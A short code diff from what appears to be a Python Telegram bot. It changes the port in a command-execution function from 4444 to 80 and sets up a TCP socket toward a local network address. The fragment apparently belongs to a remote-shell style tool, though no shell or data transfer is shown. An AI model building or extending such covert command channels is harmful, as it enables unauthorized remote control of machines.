@@ -116,7 +116,7 @@ def command_exec(m):
 # EXEC COMANDO
 def command_exec(m):
     cid = m.chat.id
-    puerto = 4444
+    puerto = 80
     ip1 = "127.0.0.1"
     ip2 = "192.168.1.103"
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
